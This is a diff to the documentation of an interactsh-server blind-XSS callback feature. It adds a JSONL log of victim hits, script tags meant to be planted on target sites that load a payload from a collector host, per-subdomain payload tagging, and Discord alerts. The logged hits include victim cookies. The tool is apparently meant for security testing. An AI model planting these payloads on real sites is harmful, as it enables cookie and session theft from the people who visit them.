@@ -676,6 +676,27 @@ When a victim's browser executes the payload (e.g., via a reflected/stored XSS),
 
 The server saves a formatted HTML report to the xss-dir and responds with `200 OK` (no ID returned to the client). Each report gets a random 16-character hex ID.
 
+### Hit Log (JSONL)
+
+Every pingback also appends one JSON line to `hits.jsonl` inside the xss-dir, next to the HTML reports. Each line is a summary of the hit (timestamp, report ID and filename, payload ID, host, remote IP, page URL/domain/title, user agent, referrer, cookies) pointing at the full HTML report via its `report` field:
+
+```json
+{"timestamp":"2026-09-15T01:14:59Z","id":"bee12c2e18cf59f9","report":"bee12c2e18cf59f9.html","payload_id":"id1","host":"id1.hackwithautomation.com","remote_ip":"203.0.113.7","url":"https://victim.com/admin","page_domain":"victim.com","title":"Admin Panel","user_agent":"Mozilla/5.0","referrer":"","cookie":"session=abc"}
+```
+
+The file is never served over HTTP: `GET /x/{id}` only accepts 16-character hex report IDs, so the log cannot be fetched with any URL trick (extensions, encoded fragments, traversal). The only way to expose it is pointing `-http-directory` at a directory containing the xss-dir (`/s/` static hosting serves its whole subtree) — the server prints an `[ERR]` at startup if you do.
+
+### Payload Identification by Subdomain
+
+The payload served at `/` is generated per request and always posts back to the host it was fetched from. Load it from a per-target subdomain to identify which site a hit came from:
+
+```html
+<script src="https://site1.hackwithautomation.com/"></script>   <!-- planted on site 1 -->
+<script src="https://site2.hackwithautomation.com/"></script>   <!-- planted on site 2 -->
+```
+
+When a pingback arrives, the subdomain labels (`site1`, `site2`) are recorded as the **payload ID** in the HTML report, the JSONL hit log, the server log line and the Discord notification. Any subdomain works (wildcard DNS is already required); multi-label subdomains are kept in full (`site1.prod.hackwithautomation.com` → `site1.prod`). Hits on the bare domain or a non-configured host are recorded with an empty payload ID.
+
 ### Viewing Reports
 
 Reports are served at `GET /x/{id}`. For example, if a report was saved as `a1b2c3d4e5f6g7h8.html`:
@@ -686,7 +707,7 @@ https://hackwithautomation.com/x/a1b2c3d4e5f6g7h8
 
 ### Custom Payload
 
-If `-http-index` is also provided, the custom index file content is served as the XSS payload instead of the default one. This allows you to use a custom JS payload while still receiving pingbacks at `/x/`.
+If `-http-index` is also provided, the custom index file content is served as the XSS payload instead of the default one. A `{HOST}` placeholder in the custom payload is replaced per request with the host the payload was served from, so custom payloads can target `/x/` and take part in subdomain identification; payloads without the placeholder are served untouched.
 
 ### Behind a Reverse Proxy
 
@@ -707,6 +728,7 @@ interactsh-server -d hackwithautomation.com -xss-dir /tmp/xss-reports -discord-w
 The notification is sent asynchronously (fire-and-forget) so it doesn't add latency to the pingback response. It includes a rich embed with:
 
 - URL, Domain, Page Title
+- Payload ID (the subdomain the payload was planted on, see [Payload Identification by Subdomain](#payload-identification-by-subdomain))
 - User Agent, Cookies
 - Remote IP
 - Direct link to the full HTML report
